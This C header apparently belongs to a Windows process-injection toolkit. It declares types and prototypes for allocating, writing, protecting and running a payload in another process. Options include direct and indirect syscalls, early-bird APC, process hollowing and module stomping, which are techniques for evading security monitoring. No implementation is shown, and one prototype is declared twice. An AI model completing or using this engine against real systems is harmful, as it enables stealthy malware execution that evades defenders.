#pragma once
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

// added to support NtQueryVirtualMemory
// https://ntdoc.m417z.com/memory_information_class
typedef enum _MEMORY_INFORMATION_CLASS
{
    MemoryBasicInformation,                     // q: MEMORY_BASIC_INFORMATION
    MemoryWorkingSetInformation,                // q: MEMORY_WORKING_SET_INFORMATION
    MemoryMappedFilenameInformation,            // q: UNICODE_STRING
    MemoryRegionInformation,                    // q: MEMORY_REGION_INFORMATION/MEMORY_REGION_INFORMATION_EX
    MemoryWorkingSetExInformation,              // q: MEMORY_WORKING_SET_EX_INFORMATION // since VISTA
    MemorySharedCommitInformation,              // q: MEMORY_SHARED_COMMIT_INFORMATION // since WIN8
    MemoryImageInformation,                     // q: MEMORY_IMAGE_INFORMATION
    MemoryRegionInformationEx,                  // q: MEMORY_REGION_INFORMATION/MEMORY_REGION_INFORMATION_EX
    MemoryPrivilegedBasicInformation,           // q: MEMORY_BASIC_INFORMATION
    MemoryEnclaveImageInformation,              // q: MEMORY_ENCLAVE_IMAGE_INFORMATION // since REDSTONE3
    MemoryBasicInformationCapped,               // q: MEMORY_BASIC_INFORMATION
    MemoryPhysicalContiguityInformation,        // q: MEMORY_PHYSICAL_CONTIGUITY_INFORMATION // since 20H1
    MemoryBadInformation,                       // q: MEMORY_BAD_INFORMATION[] // since WIN11
    MemoryBadInformationAllProcesses,           // qs: not implemented // since 22H1
    MemoryImageExtensionInformation,            // q: MEMORY_IMAGE_EXTENSION_INFORMATION // since 24H2
    MaxMemoryInfoClass
} MEMORY_INFORMATION_CLASS;

typedef LONG NTSTATUS;

typedef enum _SYSCALL_FLAVOR {
    FLAVOR_WIN32,
    FLAVOR_DFR,
    FLAVOR_DIRECT,
    FLAVOR_INDIRECT
} SYSCALL_FLAVOR;

typedef enum _PITECHNIQUE {
    DEFAULT,
    EARLY_BIRD,
    PROCESS_HOLLOWING
} PITECHNIQUE;

typedef enum _EBMETHOD {
    QUEUEAPC
} EBMETHOD;

typedef struct _INJECTION_CONTEXT {
    BOOL   spawnTarget;
    char*  spawnPath;
    DWORD  targetPid;
    HANDLE hProcess;
    HANDLE hThread;
    PVOID  pRemoteAddress;
    SIZE_T payloadSize;
    BOOL   enableStomping;
    char*  targetModule;
    char*  targetExport;
    DWORD  targetOffset;
    PITECHNIQUE technique;

    SYSCALL_FLAVOR allocFlavor;
    SYSCALL_FLAVOR writeFlavor;
    SYSCALL_FLAVOR protectFlavor;
    SYSCALL_FLAVOR invokeFlavor;

} INJECTION_CONTEXT, *PINJECTION_CONTEXT;

// Function pointer signatures, currently unused
typedef BOOL(*FnAllocate)(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor);
typedef BOOL(*FnWrite)(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor);
typedef BOOL(*FnProtect)(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor);
typedef BOOL(*FnInvoke)(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor);

/*typedef struct _INJECTION_ENGINE {
    FnAllocate Allocate;
    FnWrite    Write;
    FnProtect  Protect;
    FnInvoke   Invoke;    
} INJECTION_ENGINE, *PINJECTION_ENGINE;*/

// DFR Definitions
// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
typedef LPVOID(WINAPI* P_VirtualAllocEx)(
	HANDLE pHandle,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
typedef BOOL(WINAPI* P_VirtualProtect) (	
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
typedef BOOL(WINAPI* P_VirtualProtectEx) (
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
typedef BOOL(WINAPI* P_WriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
typedef HANDLE(WINAPI* P_CreateRemoteThread) (
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId	
);

// https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
typedef DWORD(WINAPI* P_WaitForSingleObject) (
    HANDLE hHandle,
    DWORD  dwMilliseconds
);

// --- FORCE C-LINKAGE FOR ASSEMBLY & C++ UTILITIES ---
#ifdef __cplusplus
extern "C" {
#endif

// Indirect assembly stubs from indirect-syscalls.obj
NTSTATUS IndirectSysNtAllocateVirtualMemory(
    HANDLE ProcessHandle, 
    PVOID* BaseAddress, 
    ULONG_PTR ZeroBits, 
    PSIZE_T RegionSize, 
    ULONG AllocationType, 
    ULONG Protect
);
NTSTATUS IndirectSysNtProtectVirtualMemory(
    HANDLE ProcessHandle, 
    PVOID* BaseAddress, 
    PSIZE_T RegionSize, 
    ULONG NewProtect, 
    PULONG OldProtect
);
NTSTATUS IndirectSysNtWriteVirtualMemory(
    HANDLE ProcessHandle, 
    PVOID BaseAddress, 
    PVOID Buffer, 
    SIZE_T NumberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten
);

NTSTATUS IndirectSysNtCreateThreadEx(
    PHANDLE ThreadHandle, 
    ACCESS_MASK DesiredAccess, 
    PVOID ObjectAttributes, 
    HANDLE ProcessHandle, 
    PVOID lpStartAddress, 
    PVOID lpParameter, 
    ULONG Flags, 
    SIZE_T StackZeroBits, 
    SIZE_T SizeOfStackCommit, 
    SIZE_T SizeOfStackReserve, 
    PVOID lpBytesBuffer
);

NTSTATUS IndirectSysNtWaitForSingleObject(
    HANDLE Handle, 
    BOOLEAN Alertable, 
    PLARGE_INTEGER Timeout
);

// Direct assembly stubs

// https://ntdoc.m417z.com/NtAllocateVirtualMemory
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,    
    PVOID* BaseAddress,      
    ULONG_PTR ZeroBits,      
    PSIZE_T RegionSize,      
    ULONG AllocationType,    
    ULONG Protect            
);

// https://ntdoc.m417z.com/ntprotectvirtualmemory
NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtection,
    PULONG OldProtection
);

// https://ntdoc.m417z.com/NtWriteVirtualMemory
NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,     
    PVOID BaseAddress,        
    PVOID Buffer,             
    SIZE_T NumberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten 
);

// Added missing direct prototype for the protection phase
NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// https://ntdoc.m417z.com/ntcreatethreadex
NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,        
    ACCESS_MASK DesiredAccess,   
    PVOID ObjectAttributes,      
    HANDLE ProcessHandle,        
    PVOID lpStartAddress,        
    PVOID lpParameter,           
    ULONG Flags,                 
    SIZE_T StackZeroBits,        
    SIZE_T SizeOfStackCommit,    
    SIZE_T SizeOfStackReserve,   
    PVOID lpBytesBuffer          
);

// https://ntdoc.m417z.com/NtWaitForSingleObject
NTSTATUS SysNtWaitForSingleObject(
    HANDLE Handle,          
    BOOLEAN Alertable,      
    PLARGE_INTEGER Timeout  
);

// https://ntdoc.m417z.com/ntqueryvirtualmemory
NTSTATUS SysNtQueryVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    MEMORY_INFORMATION_CLASS MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
);

#ifdef __cplusplus
}
#endif

typedef struct _LOCAL_LOADER_CONTEXT {
    DWORD     wNtAllocateVirtualMemorySSN;
    DWORD     wNtProtectVirtualMemorySSN;
    DWORD     wNtWriteVirtualMemorySSN;

    UINT_PTR sysAddrNtAllocateVirtualMemory;
    UINT_PTR sysAddrNtProtectVirtualMemory;
    UINT_PTR sysAddrNtWriteVirtualMemory;
} LOCAL_LOADER_CONTEXT, *PLOCAL_LOADER_CONTEXT;

typedef struct _INJECTION_ENGINE {
    BOOL (*Allocate)(PINJECTION_CONTEXT, DWORD);
    BOOL (*Write)(PINJECTION_CONTEXT, LPCVOID);
    BOOL (*Protect)(PINJECTION_CONTEXT, DWORD, PDWORD);
    BOOL (*Invoke)(PINJECTION_CONTEXT);
} INJECTION_ENGINE;


typedef INJECTION_ENGINE* PINJECTION_ENGINE;

// engine declarations
//BOOL InitializeResolvers(SYSCALL_FLAVOR flavor);
BOOL InitializeResolvers(PINJECTION_CONTEXT ctx);
BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor);
BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor);
BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor);
BOOL DefaultInvoke(PINJECTION_CONTEXT ctx,  SYSCALL_FLAVOR flavor);
//BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor, DWORD finalProtect);
BOOL EngineExecute(PINJECTION_ENGINE engine,
                   PINJECTION_CONTEXT ctx,
                   LPCVOID pPayload,
                   DWORD finalProtect);
char* flavorName(SYSCALL_FLAVOR f);